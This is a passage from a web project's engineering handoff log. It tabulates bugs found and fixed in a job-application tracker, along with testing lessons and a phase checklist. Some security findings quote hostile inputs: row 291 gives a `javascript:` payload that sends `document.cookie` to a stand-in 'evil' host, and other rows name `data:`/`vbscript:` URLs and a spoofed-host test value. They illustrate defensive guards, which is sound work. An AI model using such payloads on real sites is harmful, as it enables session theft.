| 257 | **A fixture URL that made the only fetchable branch unreachable** | Every fixture posting was `https://example.com/jobs/<key>`, which was fine while nothing read it. `resolveApplyTarget` reads the BOARD TOKEN out of a Greenhouse URL, so the demo would have taken the "this URL names no board" branch on every row and the fetchable one on none — the fake answering a different question than production (row 238), on the seam the whole surface hangs off. Fixture postings carry real per-family board URLs now, and `import-journey.test.ts` moved with them: one column's read-only report dropped from 2 rows to 1 because the Stripe row's URL now AGREES with the application, and the assertion names the row that still disagrees so the number cannot drift into meaning nothing | ✅ |
| 258 | **A demo whose computed date changes every morning** | `start_date`'s directive resolves against today, on the SERVER — and `page.clock.setFixedTime` freezes the browser. So an assertion or a visual baseline on that date would rot overnight while every other fixture date hangs off `FIXTURE_NOW`. The prepare call pins `today` to the fixture clock in demo mode and only there. Watched red by moving the pin | ✅ |
| 259 | **A demo seam that re-arms on every render** | `?demo=failnext` is applied by the page component, and a page component runs again on the RSC re-render every server action returns — so the failed write re-armed the seam on its way back and the RETRY failed too. `pipeline.spec.ts`'s idempotency test then found no note at all: deterministic in a full run, green whenever that file ran alone, and pointing at a product bug that was not there. Armed once per store now (`failNextWrite(message, token)`), which is also what "make the next write fail" should have meant for a person clicking around the demo with that parameter in the address bar | ✅ |
| 260 | **A test that reads a list while it is still loading** | The same test then took the note history with `allInnerTexts()` — an instant read, no retry — while the dialog still said “Loading…”, because that history comes from a separate server action. It reported zero notes for a note that had saved perfectly. Polled now, with the message that says what it was waiting for. Rows 45 and 206, arriving through a helper rather than through the app: **adding tests here broke a test over there, and both times the test was the thing that was wrong** | ✅ |
| 261 | **A host suffix that is not a host** | `endsWith("greenhouse.io")` accepts `notgreenhouse.io`, which is somebody else's domain. It could not have reached the network — the API host is a literal and both interpolated halves are checked — but it would have this app treat a stranger's posting as a Greenhouse one, which is a wrong answer with a confident shape. Dot-anchored, with the case in `apply-board.test.ts`, beside the `greenhouse.io.evil.com` one that the naive check already refused | ✅ |
| 262 | **A read cap the app enforces and never mentions** | PostgREST truncates a select at its own maximum whatever this app asks for, so the number has to exist on this side or the truncation is invisible — row 241, on the library. `APPLY_LIBRARY_LIMIT` is read by BOTH sources (pinned in `parity.test.ts`), and the settings page says so only when a user is actually at the ceiling, because a warning nobody can be affected by is the noise that teaches people to skip warnings. The consequence stated where it matters: past the cap, rows are stored and not read, INCLUDING when an application is prepared | ✅ |

| 263 | **Polarity-safe is not company-safe** | The blocker an adversarial review executed against #83, and the sentence that hid it. `prepare.ts` justified reusing a library answer on a sensitive field with "an exact question-key match is polarity-safe by construction" — true, and not the whole claim. `public.answers` had no company column, the review screen wrote every typed gap answer globally, and layer 1 runs before layer 2, so a one-off answer typed at Ramp submitted "No" at the one company where the person's own exception said Yes, on a card marked ready and reached through the growth loop the whole feature is built on. Fixed at three levels rather than patched at one: 0017 gives `answers` a `company_key` (which meant moving 0001's primary key off the raw question text), the engine resolves MOST SPECIFIC SCOPE FIRST — this company's answer, this company's rule, the global answer, the global rule — and the review screen asks where an answer applies with one checkbox that opens narrow for the topics whose truth is known to vary. An exception that then cannot answer GAPS rather than falling through, because the general answer is the one thing known to be wrong there | ✅ |
| 264 | **A person's own decline, turned into a permanent gap** | `matchOption` refuses a `decline_to_answer` option from every layer, correctly — the ENGINE must never decline for somebody. The review screen then stored the option's LABEL as an ordinary answer, so every later prepare found a value no layer may select and reported `option-mismatch`, whose copy reads "the value we would submit is not one of the options this board offers. Pick one of theirs." It is one of theirs. They picked it. And 0014 had no delete for `answers`, so the only exit was to overwrite the refusal with an answer they had chosen not to give. `answers.declined` records the CHOICE (matched on the flag, not the words, so a board wording its decline differently still gets its own option), `app_delete_answer` is the exit, and `matchOption`'s claim stays literally true — the flag is a different door and only a person can open it, because 0017 refuses `declined` on any row the authorship trigger did not stamp `user` | ✅ |
| 265 | **A cap that only works when the other end is honest** | `MAX_PAYLOAD_BYTES` gated on the DECLARED `content-length` and then called `res.json()`. A chunked response declares nothing, `Number(null ?? "0")` is 0 and `Number("abc")` is NaN, so a 20 MB body was read in full into a server-side allocation on a `force-dynamic` page. Counted off the stream now and cancelled at the bound; the declared length survives as a cheap early exit, which is all it ever was. Row 245's shape one layer down: a guard that reads a value the thing being guarded controls | ✅ |
| 266 | **A fake kinder than the store, at the boundary parity exists for** | `parity.test.ts` extracted the number 8192 from both sides and compared neither MEASUREMENT: the fake counted the UTF-8 bytes of `JSON.stringify(fact)` and Postgres counts `pg_column_size(jsonb)`, which is bigger because every element carries a 4-byte JEntry. Executed against a real postgres:16, a 679-element `countries` fact is 8,068 text bytes (saved) and 8,765 binary (refused) — the fake accepting a row the database cannot hold, which is a demo staging an application production could never produce. The fake's bound is the store's divided by the worst ratio the ALLOWED shapes reach (1.25), both numbers extracted from source, and the window pinned in both directions. Its sibling: `length()` counts characters and `String.length` counts UTF-16 units, so a 1,500-emoji question was refused as "3002 characters" — the safe direction, and still two implementations answering different questions | ✅ |
| 267 | **The one genuinely third-party value in the app, unguarded** | `lib/referral/linkedin.ts`'s `connectionUrl` guards a URL from a CSV cell and its comment names the failure; a Greenhouse payload's `absolute_url` is the same class of value and became an `href` unchecked. React 19 neuters `javascript:` and nothing else, so `data:text/html,<script>` and `vbscript:` landed verbatim. Guarded at the parser and again at the render site, where `application.url` — whatever a sweep, an import or a paste put on the row — joins it. The precedent existed, in this repo, for exactly this class, and was not applied to the one source that is actually somebody else's | ✅ |
| 268 | **A row keyed by what a person typed rather than by what the store stores** | `/settings/answers` looked a row up by RAW question text while the store keys it on the normalized form, so "Are you 18" typed by hand over a stored "Are you 18?" found nothing, sent `expectedUpdatedAt: null` — which 0014's version check skips — and replaced a stored KNOCKOUT answer with no warning. Located by `(question_key, company_key)` now. And the word in the finding was "silently": a version check turns a clobber into a conflict and still would not say which row was about to change, so the form names it before the click and its button reads "Replace answer" | ✅ |
| 269 | **A refusal screen with no path to it, on a branch that cited the rule four times** | `page.tsx` calls these "four different screens" and the demo could reach three. `no-board` — a careers page carrying `?gh_jid=`, knowably Greenhouse and unfetchable because the schema is keyed by a board token the URL lacks — was unreachable, closed by the same commit that gave fixture rows real board URLs to make the FETCHABLE branch reachable. One hole for another, with row 15 cited on both sides. Brex carries the careers URL now. Its neighbour was worse than unreachable: the `unknown` screen asserted "no posting key and **no board link**" for any row without a key, including ones carrying a perfectly good Lever or Workday URL — a fact it had not checked, on the one refusal that then offered no way out | ✅ |
| 270 | **A guard that reads a function's history** | `_sql_function_params` and parity's `UPSERT_ANSWER_FN` both took the FIRST `create or replace` of a name across the migrations. 0017 redefines `app_upsert_answer`, and the database ends up with the last definition — so both would have pinned bounds, an argument list and a validate-before-replay ordering that nothing executes any more, reporting the correct call as broken or missing a real drift depending on which way the change went. Both read the last one now. Rows 92, 130 and 163's family, arriving through migration NUMBER rather than through a regexp | ✅ |
| 271 | **A route module exporting a testable handler does not build** | `POST /api/capture` was written with `export async function handleCapture(request, store?)` so the unit suite could drive the real handler against a fake store — and Next validates a route module's exports against a closed set, so `next build` failed with "handleCapture is not a valid Route export field". Typecheck and all 1,554 unit tests were green; the BUILD is the only gate that sees this. The handler is `lib/capture/handler.ts` now and `route.ts` is the four lines Next allows | ✅ |
| 272 | **A cap that only works when the other end is honest, at the INBOUND door** | Row 265, reversed. `/api/capture` counts the request body off the stream (`lib/http/bounded.ts`, extracted from `board-source.ts` so there is ONE copy of that loop rather than two that drift). An absent `content-length` is deliberately NOT a 411 the way `/api/import/upload` answers one — a browser form always declares its size and `UrlFetchApp` is not a browser form, so refusing the unstated case would refuse the honest caller while the streaming bound already covers the dishonest one. Mutant (`readBoundedBody` → `request.text()`) red | ✅ |
| 273 | **One bad row drops the whole batch** | The sender is an LLM classifier writing rows nobody reviews, so a row this schema refuses is a matter of time — and a set-based `insert … select` is ONE statement, which means that row takes forty-nine good ones with it. `hq_capture_email_events` loops with a per-row exception block and answers `inserted`/`duplicate`/`rejected` per row, in the caller's own numbering, inside a **200** — because a 4xx tells the script's retry queue to send the batch again forever, and those rows will never be valid. Mutants red in SQL (`when others` narrowed) and in the route (a store throw reported as per-row rejections) | ✅ |
| 274 | **A store outage reported as a bad credential** | The token lookup and the batch write each answer **503**, not 401 and not per-row rejections. 401 sends an operator to rotate a token that was never the problem; per-row `rejected` tells the sender those events are bad. Same retry behaviour, different diagnosis, and the diagnosis is the thing that costs a Saturday | ✅ |
| 275 | **A 401 that says which selectors exist** | Absent header, wrong scheme, malformed token, unknown selector, wrong secret, revoked row — one status, one sentence, asserted as `new Set(answers).size === 1`. And `verifySecret` runs its digest and `timingSafeEqual` against a fixed no-such-secret digest when there is no row, so existence is not readable off the clock either. The constant-time compare itself is pinned by reading the source, because the behavioural alternative is a timing measurement, which is a flaky test | ✅ |
| 276 | **A regexp is a shape, not a moment** (row 228's family, in JS) | `Date.parse("2026-02-31T00:00:00Z")` does **not** fail in V8 — it answers March 3rd. So `normalizeStamp` re-reads the components off the constructed instant and compares them with what was written; without it a day that does not exist is accepted, silently becomes a different day, and the only thing that notices is somebody reading their own timeline months later. Mutant (round-trip block removed) red on the leap-day case too | ✅ |
| 277 | **A wire contract that tolerates what it does not recognise** | `/api/capture` REJECTS unknown fields, per row, naming them. The endpoint has exactly one client and that client's row shape is kept in lockstep with three other files BY HAND, so ignoring an unknown key means the day somebody renames `from` every event is accepted, the address is dropped, and the symptom is a column that quietly goes blank. The stated cost — a script deployed ahead of the webapp has every event rejected — is survivable because dual-write means the sheet already has them, AND because a rejected row is now retained and alerted (row 286). The first version of this row claimed the retry queue held them and it did not | ✅ |
| 278 | **The one file in this system with no gates, drifting** | `appsscript/capture/Code.gs` is pasted into script.google.com: nothing builds it, nothing runs it, and a renamed field is discovered when the endpoint rejects every event at 02:00. `tests/core/test_capture_contract.py` parses all four copies of the row shape — `core/schema.py`, `Code.gs`, `lib/capture/schema.ts`, migration 0018 — and compares them, plus the event-type vocabulary in the same four places, plus the ordering (`appendAligned_` before `deliverToStore_`) and the fact that the store lane cannot throw. Rows 92/130/163/192/243's mechanism, pointed at the component that most needs it | ✅ |
| 279 | **A second holder of the service-role key** | This app held only the anon key until now, and `lib/supabase/server.ts` says so in its header. The capture endpoint genuinely needs the exception (an Apps Script with a bearer token and no session; anon + RLS cannot express it), so the exception is bounded by a test rather than by the sentence that was already there: the env name is READ in exactly one file, no `NEXT_PUBLIC_*SERVICE` name exists anywhere, `lib/supabase/service.ts` carries `server-only`, and exactly one module imports it. Verified against the built bundle too — zero hits under `.next/static` | ✅ |
| 280 | **A credential minted into a log** | The house style for "run a thing by hand" is `handler.JOBS` + **Run a bot**, and both lanes print to a log — CloudWatch, or an Actions run log. A bearer token in either is a secret published somewhere nobody treats as a secret store. Minting is a SQL function the operator calls in the Supabase editor instead (`db/README.md` step 3's precedent), the plaintext is returned once, and the store keeps a SHA-256 — of a 244-bit random secret, which is why SHA-256 and not bcrypt: there is no dictionary to slow down, and what a digest buys is that a dump is not a set of live credentials | ✅ |
| 281 | **Rotation that silently kills the other mailbox** | The scout's alt inbox runs its own copy of the script with its own token, so `hq_rotate_capture_token` revokes by (user, LABEL) rather than by user. Mutant (label ignored) red. Revocation is a stamp and never a DELETE, because "which credential was live when that batch landed" is a question an incident asks — and `last_used_at` on the revoked row is what says whether the thing you just killed was still in use | ✅ |
| 282 | **A dedup key that dedupes everything** (row 218's shape, new door) | `''` is a legal text value and a legal key, so one caller sending a blank `event_id` would make every later event a duplicate of the first. Refused by the route with a sentence and by 0018 with a CHECK. Its opposite is refused too: the unique key is `(user_id, event_id)` and **not** `event_id` alone, because two people on one thread receive the same Message-ID and a global key would deny the second person their own row — silently, on exactly the events that matter most | ✅ |
| 283 | **A fake that accepts what the store refuses, at a boundary with no e2e** | There is no UI here, so the only thing standing between `capture-route.test.ts`'s batch semantics and the truth is `FakeCaptureStore`. `capture-parity.test.ts` extracts 0018's own text — the event-type array, the batch cap, all three CHECK constraint names, the `insert into` column list — and holds the fake to each, then runs a corpus through `parseEvent` and asserts everything it ACCEPTS the store accepts. A validator looser than the store is a class of row that passes, travels, and comes back as a raw constraint name nobody reads | ✅ |
| 284 | **A retry queue that fails the lane it is protecting** | The Apps Script's POST is second and may never throw: a store outage that raised there would ops-push, rethrow (the file does that on purpose so Google's trigger-failure mail fires), skip the heartbeat, and look exactly like Gmail capture itself dying — the one alarm in this system that means "statuses are not advancing". So `deliverToStore_` swallows, `postChunk_` mutes HTTP exceptions, the heartbeat fires first, and the undelivered batch parks in a Script Property. **No push for a failed POST** (a Vercel deploy would alert every 15 minutes, which is how an ops channel gets ignored); one push when the bounded queue DROPS, because at that point rows really are only in the sheet | ✅ |
| 285 | **A lone surrogate kills the batch OUTSIDE the per-row exception block** | The endpoint's central claim, defeated by ordinary recruiter mail. `Code.gs` truncated with `.slice(0, n)` on UTF-16 units — `snippet` at 300, five more in the classifier — so an emoji landing on the boundary is cut in half, and Postgres refuses an unpaired surrogate (22P02) or a `U+0000` (22P05) at the **jsonb cast**, one layer ABOVE the loop the whole function exists for. Measured: one poisoned row in a batch of 50 lost all 50, then wedged — the chunk requeues at the FRONT of the next run and takes every event behind it, for weeks, reported as "the endpoint was unreachable". Fixed at both ends: `safeTruncate_` never splits a pair (EXECUTED by `capture-appsscript.test.ts`, the only test in this repo that runs Apps Script source), and `storable()` repairs anything any other sender produces. `event_id` is the one field repaired-means-rejected, because a key this parser invented is a key that can collide. Mutants red on both sides | ✅ |
| 286 | **"The retry queue holds the rows" — it did not** | A per-row `rejected` arrives inside a **200**, so `postChunk_` returned true, `stats.dropped` stayed 0, and the rows were dropped the instant they were sent — while `schema.ts`, `appsscript/README.md` and row 277 all named that queue as the mitigation for the deploy-order hazard. The response's behaviour was right and three documents were wrong, which is the worse half: it is the sentence that makes "reject unknown fields" read as low-risk. The claim is TRUE now rather than softened — refusals park in their own store (never the front of `pending`, so a permanently-bad row cannot block fresh mail), are retried last so a fixing deploy drains them, and produce an ops push naming the count and the first reason | ✅ |
| 287 | **Two stores, because "not delivered" has two meanings** | Transport failure (network, 5xx, 408/429, and 401/403 — a token mid-rotation) queues and retries first. A refusal (a 200's `rejected`, or any other 4xx) parks and retries last. Collapsing them is what lost the rows in row 286, and separating them is also what finally makes the documented 413/400 split mean something: a 413 used to be requeued at the identical size forever | ✅ |
| 288 | **A cry-wolf push inside the function arguing against cry-wolf** | `captureBacklogReport_` fired on every run with a drop — and once the queue is full every run with fresh mail drops something, so a long outage pushed every 15 minutes. Latched per day per message, `tracker/join.py:check_capture_liveness`'s own pattern. Same function, second bug: it sat in the section headed "nothing here may throw" and was the one thing in it called from `runCapture` outside any try, so a `PropertiesService` hiccup would rethrow and fire the "Gmail capture itself died" alarm the section exists to prevent | ✅ |
| 289 | **A read policy is not a revoke** | `email_events` had RLS and a read policy and no revoke, so its writes were shut by the ABSENCE of a rule rather than the absence of a privilege — add one plausible future `for all using (user_id = auth.uid())` policy and a browser updates and deletes its own captured mail. `capture_tokens` sixty lines earlier does name the revoke and survives the same test. 0002, 0010 and 0013 all name it; this table was the outlier. (`test_browser_still_has_no_direct_write_policy` matches only `for (insert\|update\|delete)`, so a `for all` policy walks past it — pre-existing, and this was the table it would have mattered on) | ✅ |
| 290 | **The validator looser than the store, on the input the parity test names** | `parseEvent` trimmed `event_id` with `String.trim()`; 0018's CHECK uses `hq_blank_trim`, which also strips `U+200B/200C/200D/FEFF`. A zero-width-only id passed the route and came back as a raw constraint name — the exact failure that file was written to prevent, one severity below row 285's. The blankness test uses `view-models.ts`'s existing `blankTrim` port now; what is STORED is still the untouched original, because normalising a key is what row 285 refuses to do | ✅ |
| 291 | **A stored one-click, waiting for a feature already designed** | `job_url` is the one genuinely third-party value on the row — an LLM read it out of an untrusted email body — and it was stored unchecked, with `javascript:fetch('//evil/'+document.cookie)` measured straight through. PHASE-DIGEST 3–6 puts these rows into a mailed HTML document. Guarded at the boundary, `thread_link` alongside it so nobody has to remember which of the two was covered. Matrix row 267's precedent, in this repo, not applied here the first time — **and then over-applied: see row 296** | ✅ |
| 292 | **A comment that made the function the enforcement point when the route was** | `hq_capture_email_events` never checked that `p_token_id` belonged to `p_user_id`, and never looked at `revoked_at` — measured by stamping user B's token for rows stored under user A, and by storing normally with a revoked id. Unreachable through the one caller, which always passes the pair it resolved; the problem is a comment ("the credential's proof of life") that the NEXT caller would trust. Checked before the loop now, so a bad pairing writes nothing rather than raising after work it should not have started | ✅ |
| 293 | **A 500 out of the credential check** | `verifySecret` guarded on STRING length while `timingSafeEqual` compares BUFFER length, and `Buffer.from(s, "hex")` truncates at the first invalid pair — so 64 characters of non-hex decoded to zero bytes, walked past the guard, and threw. Unreachable through the store (0018's digest CHECK) and one line to close: the guard reads the shape, not the length | ✅ |
| 294 | **A dead promote nobody noticed for the life of the file** | `onFeedEdit` called `getTabByGid_(PIPELINE_GID)` against `getTabByGid_(ss, gid)`, so `ss` was the number `0`, `ss.getSheets()` threw into the edit trigger's own catch, and ticking `interested` on the Feed has never once landed a Pipeline row instantly — the 2-hourly Python `promote` has been carrying it silently since the day it shipped. Pre-existing on `main`, verified there, fixed here because it is four lines from the code C2 touches. The contract test now reads the argument count of every `getTabByGid_` call, with a balanced-paren parser because `[^)]*` reported the CORRECT call as broken on its first run (row 92's shape, in the guard written to catch an arity bug) | ✅ |
| 295 | **A latch that is a change detector** | The fix for row 288 pushed MORE than what it replaced. `alertOncePerDay_` keyed on `"dropped:" + total` — a running count, which changes precisely when the situation persists — and both kinds shared one property, so each cleared the other's stamp. Measured on the real `Code.gs`: **6 pushes over 8 same-day runs** of a drop storm, and **9 over 6 runs** of the deploy-order refusal storm the parked pen exists for, roughly six ntfy pushes an hour all day. Against the axis row 288 was about, that is a regression: 2/run where there was 1. One property per KIND now, keyed on the bare date; counts and reasons live in the message body where a person reads them | ✅ |
| 296 | **A guard that treated content as identity** | The row-291 URL guard refused the whole EVENT for any non-http(s) value, so an interview notification whose `job_url` said `"N/A"`, `"not specified"`, `"/jobs/1234"`, `"www.ramp.com/careers"` or `" https://x.co/j"` was dropped — and `Code.gs` does not pre-validate, so whatever Haiku writes in a field nobody reads decided whether a status change survived. It contradicted the rule stated twenty lines above it in the same file (`storable()`: normalise for content, refuse only for identity). Repaired where unambiguous (trim; `www.` gets `https://` — it can begin neither a scheme nor a path), blanked otherwise, event always stored, and the edit reported as a `note` beside the outcome with a `repaired` count, because a repair nobody is told about is a silent edit. Dangerous schemes blank too: same answer, and the note is what keeps them visible | ✅ |
| 297 | **A test file advertising a mutant it does not kill** | `capture-appsscript.test.ts`'s header named `>= 0xD800` → `> 0xD800` as covered "at U+1F3AF". 🎯's high surrogate is 0xD83C, which is still `> 0xD800`, so the mutant behaved identically on every character in the corpus and survived — 0 of 123 cut lengths ill-formed. U+D800 is the ONLY high surrogate the two comparisons disagree about, so the corpus has to contain a character that uses it; U+10000 does, and the sweep now fails at 30 of 123 under the mutant. A header listing mutants is a promise, and this one was checkable | ✅ |
| 298 | **A source-text test standing in for a behavioural one, third time** | The latch test asserted `report.count("alertOncePerDay_(") == 2` — call sites, which a latch that does not latch satisfies perfectly. Row 295 is what it missed. `Code.gs` is now EVALUATED with stubbed Google globals (`PropertiesService`, `Utilities`, `Logger`, `opsPush_`) and the pushes are COUNTED over eight same-day runs and across a day boundary. The Python contract test keeps only what a source read can honestly establish: the parameter is a slot, there are two of them, and the stored value is the bare date | ✅ |

Two intermittent failures were seen once each on a Mac during the full-suite runs
for this branch and passed on re-run: `undo-delivery.spec.ts` (its 8s offline
hold, racing a reload under seven workers) and `grid.spec.ts`'s skeleton-rail
geometry (row 101's family — a pixel claim on a bare runner). Neither reproduced
in isolation or in the runs that followed, and neither is claimed as fixed. They
are named because "it went green the second time" is exactly the sentence the
next person needs to have read.

Three container failures survive on this branch and none of them is P8's: two are
`empty.spec.ts:72` (passes cleanly in isolation in the same image — a parallel-load
artefact under qemu, present on `main`) and `grid-perf.spec.ts`'s 4x-CPU budget,
which is the same wall-clock-versus-emulation problem row 138 describes and which
`main` already fails. They are named here rather than left for the next person to
rediscover; row 138's ratio technique is the fix if anyone wants grid-perf green.

Row 21 is the rule working as intended. A Linux CI runner failed the keyboard
test that had always passed on the Mac: `goto` resolves when the server HTML
paints, which is *before* React attaches the keydown listener, so a key pressed
in that window does nothing. The tempting fix is a sleep in the test. The real
one is that the card renders its shortcut hints from the server and therefore
advertises a capability it does not yet have — a fast human hits the same gap.
The queue now says when it is interactive, the hints dim until then, and the
tests wait on that flag rather than racing it.

Rows 22–24 came from one habit worth keeping: **open the app and look at it.**
The full suite was green — 76 tests, axe clean in both themes, no overflow at
any width — while three things were plainly wrong on screen. Dark mode had
never been wired up at all (the class-driven palette had nothing applying the
class, and the "dark" visual baselines were light-theme images). The `i` hint
on the primary button rendered invisible, which axe skips by design because the
element is `aria-hidden`. And on a phone the nav filled the first screen, so
the app opened on its own menu.

The common thread: **a test suite only asserts what someone thought to assert.**
Screenshots are cheap and catch the class of bug that passes every check.

**Rule going forward: a bug found by a human — or by a slower machine, or by
looking at a screenshot — becomes a row in this table with a test, not just a
fix.**

The web app **was not in CI at all** before this phase.

Row 15 is the same lesson as 22–24, arriving through a different door. The
empty states were unreachable: the fixture set is deliberately full, and
draining the queue by hand produces "you finished", which is a *third* state.
So nobody had ever seen the other two. `/health` rendered six column headings
over an empty table body — on the one surface whose entire job is telling you
whether the machinery is alive, where no rows reads as all-clear and means the
opposite. And `/queue` said "Nothing to triage" whether the sweep had found
nothing or the search profile had gated every posting out. The second is a
setting the user can widen in ten seconds; presenting it as a quiet day is how
a working system convinces someone it is dead.

The cause underneath was a fake that was too forgiving *again*, in the same
shape as the Python one: `FixtureDataSource` took postings and applications
from its constructor but returned the health fixture unconditionally, so a
store built with no data still reported six healthy channels. A zero-row
`/health` was not reachable through the only source the tests can drive, which
is exactly why that page shipped broken. **Every collection a fake owns must
come from its constructor** — an injectable that is injectable "except for one
field" is the field that will be wrong.

### What an adversarial sweep found that 133 green tests did not

Eight agents were pointed at the app with one instruction each — break this —
and every finding was then handed to an independent skeptic whose job was to
refute it. 45 findings, 32 survived refutation. The suite was green throughout.

The single most valuable one is worth stating plainly, because it invalidates a
whole class of confidence: **the demo/fixture store existed three times over.**
`const stores = new Map()` at module scope looks like a singleton and is not
one — Next compiles pages, server actions and route handlers into separate
bundles, each with its own copy of the module. So a triage decision returned a
server-confirmed "Saved …" toast, landed in a store nothing else read, and the
card was back on the next page load. The export dialog counted rows from a third
copy, so it could promise 5 rows and hand over 8.

Every E2E test passed anyway, for one reason: they all assert against client
state immediately after a gesture, and **not one of them reloads.** The fix is
three lines. The lesson is not.

The other pattern worth keeping: three separate findings were tests that cannot
fail. `layout.spec.ts` enforced the owner's number-one constraint by asserting
`document.documentElement.scrollWidth`, while `globals.css` sets
`overflow-x: hidden` on html and body — which converts "hangs off the page" into
"silently clipped" and pins that number at the viewport width forever. The guard
would have passed with content overflowing by 1000px. Matrix rows 8, 9 and 10
were likewise marked ✅ while nothing anywhere exercised them: `failNextWrite()`
had zero callers.

**A test that cannot fail is worse than no test, because it is counted.** When
adding a row to this table, make the test fail first, on purpose, and say so.

That rule has since caught two more, both written by the session that wrote the
rule. A concurrency test ran its two connections in turn, so they never
overlapped inside the function under test and it passed with the fix removed; a
second attempt let the lock holder roll back before writing, so the race still
could not occur. Only the third version — where the lock holder performs the
real write while the other caller is already blocked — actually fails without
the fix. **Assume your own new test is in this category until you have watched
it go red.**

The same trap has a documentation shape. `test-harness.sql` created the
`authenticated` role but none of the privileges Supabase grants it, so
`set role authenticated` got "permission denied" on every table — and an RLS
test asserting "A cannot read B's rows" passed because A could read *nothing*,
and would have kept passing with every policy in the schema dropped. A negative
assertion is only meaningful beside its positive control.

### Three corrections this phase made to claims written above

Worth keeping, because each was stated confidently and was wrong:

1. **axe does see `aria-hidden` text for contrast.** Row 23's note claimed it
   could not. It flagged the `⌘E` hint on the Export button immediately. What
   axe genuinely cannot catch is a hint that is invisible because it *inherited*
   its background colour — so the `currentColor` rule stands, for a different
   reason than the one recorded.
2. **`opacity` is a contrast bug generator.** `Kbd` was `opacity-70`, which
   reads as pleasantly subdued and quietly turned an 8.6:1 token into 3.95:1 on
   screen. A component can pass on its tokens and fail in the DOM. There is now
   no opacity in `Kbd`; de-emphasis comes from size and border.
3. **`write-excel-file` can do autofilter**, despite exposing no option for it —
   `docs/plans/` records it as unachievable, from reading the option list. It
   has a documented feature hook and its element-ordering table already knows
   where `<autoFilter>` belongs. Reading the option list said no; trying it and
   unzipping the result said yes. Spec §E's autofilter promise is kept.

---

## Current state

- [x] Handoff doc created
- [x] Stack verified against live npm (2026-07-21) — see "Stack" below
- [x] **Foundation** — Tailwind v4 tokens, Radix primitives, app shell, data
      layer, Vitest + Playwright, webapp now in CI (it was not before)
- [x] **Triage** — decision bar, keyboard, optimistic writes with undo
- [x] **Export** — CSV/TSV core with RFC-4180 quoting + BOM
- [x] **Export dialog + XLSX** — scope selector that states its counts, server-
      side generation, frozen header + autofilter + real dates
- [x] **Matrix rows 15–17** — empty states, session expiry, offline outbox
- [x] **Remaining-phase plans + scaling research** — `docs/plans/`
- [x] **Grid G1** — read-only virtualized grid at `/jobs`, sticky header + first
      column, measured perf budget at 5k rows
- [x] **Grid G2** — filter engine, URL state (row 19 / criterion 22), sort,
      group, quick search, filter bar
- [x] **Grid G3** — saved views (`0005` migration + RLS + db tests), built-in
      presets, personas, density/type/hints, the why-filtered popover
- [x] **Grid G4** — selection (shift-click ranges, prune-on-filter), ⌘C copy,
      export scope menu, atomic bulk triage (`0006` migration + db tests)
- [x] **Grid G5** — Linux visual baselines (row 14 closed), axe-with-selection,
      large-type column scaling. **The grid phase (build-order step 4) is complete.**
- [x] **P7 — `/companies` universe review grid** (`docs/plans/HQ-V2-BUILD.md` §P7,
      built in the order `COMPANY-DISCOVERY-RESEARCH.md`'s UX teardown binds:
      provenance column → bulk verbs → coverage meter → NL bar → personas).
      Migration **0008** (`review_state` + `updated_at` on `user_companies`, three
      RPCs); the grid extends the /jobs primitives rather than replacing them —
      `selection.ts` unmodified, `why-popover.tsx` **copied** as the Resolution
      column, `view-switcher.tsx`'s pattern **copied** for sets + personas. Neither
      original was touched; "re-skinned" reads as reuse and would send the next
      session looking for a shared component that does not exist. Matrix rows
      83–101. **The honest scope line:** the NL half of the "add companies" bar is a
      paste box, because the discovery agent (`monitor/discovery_agent.py`) is Python
      on the Lambda schedule with no route into the app — `POST /api/companies/propose`
      answers **501** for a `facet`, with the reason, so the contract is ready and
      the gap is visible rather than mimed.
- [x] **P7 fix pass** — two adversarial reviews, both executed against real
      Postgres and real mutants rather than read off the diff. Rows 93–99 came out
      of it, and the worst of them (93) is the shape worth remembering: **a
      uniqueness key that cannot collide with the rows it is meant to deduplicate.**
      `(name, '', '')` looked like a conflict key and was a guarantee of a
      duplicate, because every grounded row has a non-empty ats+slug by
      construction. Nothing was going to catch it — the test that should have was
      itself broken (`slug or uuid4()` turned `slug=""` into a random slug, so the
      row it built was grounded after all and the key under test was never
      exercised). Also out of this pass: 40 db tests where there were 22, the four
      UI strings that promised sweep behaviour nothing implements reworded to what
      is true, and every `-linux` visual baseline re-recorded in one container run
      because /jobs and /queue predated the nav item and were passing on tolerance
      alone. **Not wired at the time, and said out loud on screen rather than in a
      plan:** the Python sweep read neither `review_state` nor `monitor`, and nothing
      upgraded a pasted tier-3 row when the resolver later grounded the same name — it
      wrote a second row, and the subscription stayed on the first. **Both are wired
      now** (`feat/sweep-review-integration`, migration **0009**), with one honest
      remainder each: the resolver upgrades that row in place so the subscription survives
      with nothing to repoint — unless the board is already held by a second spelling of
      the same company, which stalls at tier 3 and writes a `company.grounding_blocked`
      event rather than pretending; and `monitor/universe.py` reads
      `review_state='approved' AND monitor` and the dismissals, which the discovery agent
      consumes, while `monitor/run.py` still reads the sheet (see the fork). The four UI strings above were
      reworded a second time, forward this time. One piece stays open on purpose and is
      the owner's call, not a build gap: **which store is authoritative for which user**
      — `monitor/run.py` still reads the sheet's Companies tab, and no mirror was
      invented in either direction (fork written up in `docs/plans/COMPANY-DISCOVERY.md`).
      **Then CI failed on two of its own new tests, both green locally** (rows 100
      and 101), and both for the same underlying reason: *the runner is not the
      machine you wrote the test on.* One was a real product bug the local fonts
      hid (a toast covering the button that produced it); the other was a pixel
      assertion running outside the one environment where pixels mean anything.
      The rule that follows is already half-written above under visual baselines,
      so state the other half: **a geometry assertion belongs in the container job,
      and a plain-e2e assertion must not be able to move when a font changes.**
- [x] **P8 — `lib/status.ts` + the Pipeline** (`docs/plans/PHASE-PIPELINE.md`;
      migration **0010** — the plan pencilled 0008, P7 took that, and the universe
      reconciler took 0009 while this branch was in flight;
      `test_migrations_are_contiguously_numbered` is what caught the collision, since
      the rebase itself was clean). Discharges AC 11, 12, 13, 14, 26 and the render
      side of 15. Matrix rows **102–128**.

      Four claims that read as true and were not — the useful residue:

      1. **The obvious human-wins lock guarantees the bug it prevents.** "Allow the
         write when it also sets `status_actor='user'`" fails because an UPDATE that
         does not mention a column carries the OLD value into `new`: on an
         already-locked row every bot write satisfies the guard for free, so the one
         row the trigger exists to protect was the one it waved through. A row
         trigger cannot see the SET list, so the declaration is an explicit
         transaction-local flag, set and cleared per statement.
      2. **`btrim(x)` trims spaces only** — not tabs, not newlines. Every "must not
         be empty" check in the first draft of 0010 accepted a lone newline into an
         append-only table with no delete. `hq_blank_trim` exists for that, and the
         table CHECK uses it too.
      3. **`@theme inline` makes a runtime type scale impossible.** It substitutes
         token values into utilities at build time, so `text-xs` is a literal
         `.75rem` and overriding `--text-xs` on a selector reaches nothing. The
         large-type cookie changed the body font (a real `var()`) while every
         `text-*` utility stood still — the status pill grew its text and not its
